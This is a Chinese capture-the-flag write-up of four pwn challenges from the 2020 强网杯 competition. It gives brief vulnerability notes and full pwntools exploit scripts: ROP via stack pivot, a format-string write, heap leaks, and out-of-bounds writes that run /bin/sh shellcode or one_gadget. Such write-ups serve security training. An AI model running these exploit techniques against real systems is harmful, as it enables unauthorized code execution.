# 2020 强网杯 wp

当时做, 做了四道题, wp先贴在这里 



## 1-babymessage

漏洞 (可以修改rbp 的值) 堆栈迁移使 [rbp - 4 ]> 0x100( mm ), 即可实现堆栈溢出

## exp

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'babymessage'
#libFile = '/lib/x86_64-linux-gnu/libc.so.6'
libFile = './libc-2.27.so'

remoteIp = "123.56.170.202"
remotePort = 21342

LOCAL = 0
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)


#--------------------------Exploit--------------------------
def exploit():
	leak_fun = 'puts'
	dp_fun = 'puts'
	pop_rdi = 0x400ac3
	start = 0x4006e0
	offset = 0x8

	sla(':', '1')
	sa(':', p32(0x101))
	sla(':', '2')
	sa(':', 'B' * 0x8 + p64(0x6010d0 + 4))

	sla(':', '2')

	ru(':')
	p = 'A' * offset
	p += p64(0)
	p += p64(pop_rdi)
	p += p64(exe.got[leak_fun])
	p += p64(exe.plt[dp_fun])
	p += p64(start)
	#db()
	s(p)

	leak = u64(ru('\x7f')[-5:] + '\x7f\x00\x00')
	li('leak ' + hex(leak))
	libc_base = leak - lib.sym[leak_fun]
	li('libc_base ' + hex(libc_base))

	libc_sys = libc_base + lib.sym['system']
	libc_sh = libc_base + 0x00000000001b40fa


	sla(':', '1')
	sa(':', p32(0x101))
	sla(':', '2')
	sa(':', 'B' * 0x8 + p64(0x6010d0 + 4))

	sla(':', '2')
	p = 'A' * offset
	p += p64(0)
	p += p64(0x400809)
	p += p64(pop_rdi)
	p += p64(libc_sh)
	p += p64(libc_sys)
	p += p64(0)
	#db()
	s(p)


def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()

```





## siri

格式化字符串漏洞, 泄漏elf_base和libc_base, got表不能修改, 只能先泄漏stack地址, 修改ret地址打one_gadget了,  (已经可以修改ret地址了, 打one_gagdgt 打通了, 不知啥原因, execve函数会跳转到read函数, 导致输入token会出错, 原因: io已经处于shutdown状态)

另一种劫持,劫持libc中的got表地址, puts函数中存在plt跳转,修改该跳转函数的got地址为one_gadget即可. 



### exp

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

#context.log_level='debug'

exeFile = 'Siri'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'
libFile = './libc.so.6'


remoteIp = "123.56.170.202"
remotePort = 12124

LOCAL = 0
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------

#--------------------------Exploit--------------------------
def exploit():
	sl('Hey Siri!')
	p = 'Remind me to '
	p += '%1$p, %83$p, %85$p'

	sa('?', p)
	ru('0x')
	elf_base = int(r(12), 16) - (0x55dde8275033 - 0x55dde8273000)
	li('elf_base ' + hex(elf_base))
	ru('0x')
	libc_base = int(r(12), 16) - lib.sym['__libc_start_main'] - 231
	li('libc_base ' + hex(libc_base))

	ru('0x')
	target_addr = int(r(12), 16) - (0x7fffb9b2b008 - 0x7fffb9b2af38) - 0x10
	target_addr = libc_base + (0x7f667e8880a8 - 0x7f667e49d000)
	li('target_addr ' + hex(target_addr))
	
	gadget = [0x4f365, 0x4f3c2, 0x10a45c, 0xe58b8, 0xe58bf, 0xe58c3, 0x10a468]
	one_gadget = libc_base + gadget[5]
	#one_gadget = libc_base + lib.sym['system']

	l_addr = one_gadget & 0xFFFF
	h_addr = (one_gadget & 0xFF0000) >> 16


	li('l_addr ' + hex(l_addr))
	li('h_addr ' + hex(h_addr))


	sl('Hey Siri!')
	offset = 14 + 30 + 5
	pre_len = len("OK, I'll remind you to ")
	ru('?')
	p = 'Remind me to '
	p += 'AAA' # ajust
	p2 = '%'  + str(h_addr - pre_len - 7)  + 'c%' + str(offset + 4) + '$hhn'
	p2 += '%'  + str(l_addr - h_addr)  + 'c%' + str(offset + 5) + '$hn'
	if(len(p2) % 8 != 0):
		while(len(p2) % 8 != 0):
			p2 += 'A'
	p += p2
	p += p64(target_addr + 2)
	p += p64(target_addr)

	li('off ' + str(len(p2) / 8))
	#db()
	s(p)
	li('one_gadget ' + hex(one_gadget))
	#p = target_addr




def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()

```



## 3-oldschool

题目给了源码和libc, 需要自己编译, 源码如下

```c
// Ubuntu 18.04, GCC -m32 -O3
#include<stdlib.h>
#include<stdio.h>
#include<unistd.h>
#include<sys/mman.h>
#include<sys/types.h>

#define NUM 0x10

#define ADDR_LOW    0xe0000000
#define ADDR_HIGH   0xf0000000

char* chunks[NUM];
unsigned sizes[NUM];

int* g_ptr = NULL;

void init_io(){
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
}

unsigned get_int(){
    unsigned res;
    if(scanf("%u", &res) != 1) exit(0);
    return res;
}

void mmap_delete(){
    if(g_ptr != NULL) return;

    munmap(g_ptr, 0x1000);

    g_ptr = 0;
}

void mmap_allocate(){
    if(g_ptr != NULL) return;

    printf("Where do you want to start: ");
    unsigned idx;
    idx = get_int(); 

    idx = (idx >> 12) << 12;

    if(idx >= (ADDR_HIGH - ADDR_LOW) ) return;

    g_ptr =  mmap(ADDR_LOW + idx, ADDR_HIGH - ADDR_LOW - idx, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); 

    if(g_ptr != (ADDR_LOW + idx)){
        exit(0);
    }
}

void mmap_edit(){
    if(g_ptr == NULL){
        printf("Mmap first!");
        return;
    }

    unsigned value;
    unsigned idx;
    printf("Index: ");
    idx = get_int(); 
    
    if(g_ptr + idx < g_ptr && (unsigned)(g_ptr + idx) < ADDR_HIGH){ // vul
        puts("Invalid idx");
        return;
    }

    printf("Value: ");

    value = get_int(); 
    g_ptr[idx] = value;
}

void allocate(){
    unsigned size;
    unsigned idx;
    printf("Index: ");
    idx = get_int(); 
    if(idx >= NUM || chunks[idx]){
        return ;
    }

    printf("Size: ");
    size = get_int() & 0x1FF;

    char* buf = malloc(size);
    if(buf == NULL){
        puts("allocate failed");
        return;
    }
    chunks[idx] = buf;
    sizes[idx] = size;
    puts("Done!");
}

void delete(){
    unsigned idx;
    printf("Index: ");
    idx = get_int(); 
    if(idx >= NUM || chunks[idx] == NULL){
        return ;
    }
    
    free(chunks[idx]);
    chunks[idx] = NULL;
    sizes[idx] = 0;
}

void show(){
    unsigned idx;
    printf("Index: ");
    idx = get_int(); 
    if(idx >= NUM || chunks[idx] == NULL){
        return ;
    }
    
    printf("Content: %s\n", chunks[idx]);
}

void readn(char* s, unsigned size){
    for(unsigned i = 0; i < size; i++){
        read(0, s + i, 1);
        if(s[i] == '\n')break;
    }
}
void edit(){
    unsigned idx;
    printf("Index: ");
    idx = get_int(); 
    if(idx >= NUM || chunks[idx] == NULL){
        return ;
    }
    printf("Content: "); 
    readn(chunks[idx], sizes[idx]);
}

void menu(){
    puts("1. allocate");
    puts("2. edit");
    puts("3. show");
    puts("4. delete");
    puts("5. exit");
    printf("Your choice: ");
}

int main(){
    init_io();
    while(1){
        menu();
        unsigned choice = get_int();
        switch(choice){
            case 1:
                allocate();
                break;
            case 2:
                edit();
                break;
            case 3:
                show();
                break;
            case 4:
                delete();
                break;
            case 5:
                exit(0);
                break;
            case 6:
                mmap_allocate();
                break;
            case 7:
                mmap_edit();
                break;
            case 8:
                mmap_delete();
                break;
            default:
                puts("Unknown");
                break;
        }
    }
    return 0;
}

```

### 思路

先使用堆块布局泄漏libc, 然后通过mmap_edit 中的漏洞实现高地址写入, 修改 exit_hook   

 _rtld_lock_unlock_recursive 为mmap开辟的地址, 然后调用exit时跳转到mmap开辟的地址执行shellcode

mmap_edit漏洞: 

### Vul

```c
void mmap_edit(){
    if(g_ptr == NULL){
        printf("Mmap first!");
        return;
    }
    unsigned value;
    unsigned idx;
    printf("Index: ");
    idx = get_int(); 
    
    if(g_ptr + idx < g_ptr && (unsigned)(g_ptr + idx) < ADDR_HIGH){ //漏洞
        puts("Invalid idx");
        return;
    }
    printf("Value: ");
    value = get_int(); 
    g_ptr[idx] = value;
}
```

### exp

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'pwn'
#libFile = '/lib/x86_64-linux-gnu/libc.so.6'
libFile = './libc-2.27.so'

remoteIp = "0.0.0.0"
remotePort = 0

LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(idx, size):
	sla(':', str(1))
	sla(':', str(idx))
	sla(':', str(size))

def rm(idx):
	sla(':', str(4))
	sla(':', str(idx))

def md(idx, data):
	sla(':', str(2))
	sla(':', str(idx))
	sa(':', data)

def dp(idx):
	sla(':', str(3))
	sla(':', str(idx))

def q():
	sla(':', str(5))	

def mad(start_addr):
	sla(':', str(6))	
	sla(':', str(start_addr))	

def mmd(idx, value):
	sla(':', str(7))
	sla('x:', str(idx))
	sla('e:', str(value))

def mrm():
	sla(':', str(8))	

def m_ad_sc(sc):
	while(len(sc) % 4 != 0):
		sc += '\x00'
	sc_len = len(sc)
	li('\n')
	for i in range(sc_len / 4):
		j = i * 4
		s = sc[j : j + 4]
		n = u32(s)
		mmd(i, n)
		li(hex(n))
		

#--------------------------Exploit--------------------------
def exploit():
	li(rl())

	ad(0, 0x100)
	ad(1, 0x100)
	rm(0)
	rm(1)
	ad(0, 0x100)
	dp(0)
	ru(':')
	heap_base = u32(ru('\n')[-4:]) - 0x160
	rm(0)

	# leak libc
	for i in range(9):
		ad(i,0x100)
	for i in range(9):
		rm(i)

	for i in range(8):
		ad(i,0x100)
	md(7, 'AAA\n')
	dp(7)
	libc_base = u32(ru('\xf7')[-3:] + '\xf7') - (0xf7f107d8 - 0xf7d38000)
	libc_got  = libc_base + (0xf7f20000 - 0xf7d48000)
	exit_hook = libc_base + 0x209838
	# p _rtld_global
	# _rtld_lock_unlock_recursive
	# _rtld_lock_lock_recursive

	li('heap_base :' + hex(heap_base))
	li('libc base: ' + hex(libc_base)) 
	li('libc got: ' + hex(libc_got)) 
	li('exit_hook: ' + hex(exit_hook)) 

	mad(libc_base & 0xFFFFFFF)

	midx = (exit_hook - (0xe0000000 + (libc_base & 0xFFFFFFF))) / 4
	maddr = 0xe0000000 + (libc_base & 0xFFFFFFF)

	li('maddr: ' + hex(maddr)) 
	li('hex ' + hex(midx))

	mmd(midx, maddr)

	sc = "\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80"
	m_ad_sc(sc)

	#db()
	q()



def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
```





## 4-Galgame

### Vul

```c
 if ( p_addr[atoi((const char *)&buf)] )
          {
            printf("movie name >> ", &buf);
            v4 = atoi((const char *)&buf); //对v4没有进行溢出检查, 也可以对p_addr附近存在的地址进行写入
            read(0, (void *)(p_addr[v4] + 0x60), 0x10uLL);// 溢出8字节漏洞
            puts("\nHotaru: What a good movie! I like it~\n");
            puts("[ You've gained a lot favor of her! ]");
          }
```



先通过8字节溢出修改top chunk size, 开辟0x1000不够, 则实现free功能泄漏libc, 在通过v4没有检查漏洞可进行数组越界和退出输入配合实现任意地址写入, 修改libc puts中*ABS*+0x9dce0plt 跳转的 got表打one_gadget

### exp

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *

context.log_level='debug'
exeFile = 'Just_a_Galgame'
#libFile = '/lib/x86_64-linux-gnu/libc.so.6'
libFile = './libc.so.6'

remoteIp = "0.0.0.0"
remotePort = 0

LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad_68():
	sla('>>', '1')
def mv(idx, name):
	sla('>>', '2')
	sla('>>', str(idx))
	sa('>>', name)
def ad_1000():	
	sla('>>', '3')

def dp():
	sla('>>', '4')

def q():
	sla('>>', '5')
	sa('QAQ\n', 'No bye!\x00')

#--------------------------Exploit--------------------------
def exploit():

	ad_68()
	mv(0, '\x00' * 8 + p64(0xd41))
	ad_1000()
	ad_68()
	dp()
	libc_base = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - (0x7f70a91f92a0 - 0x7f70a8e0d000)
	li('libc_base: ' + hex(libc_base))

	sla('>>', '5')
	target = libc_base + (0x8880a8 - 0x49d000)
	one_gadget = libc_base + 0x4f3c2
	sa('QAQ\n', p64(target - 0x60))
	db()
	mv(8, p64(one_gadget))
	

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()

```

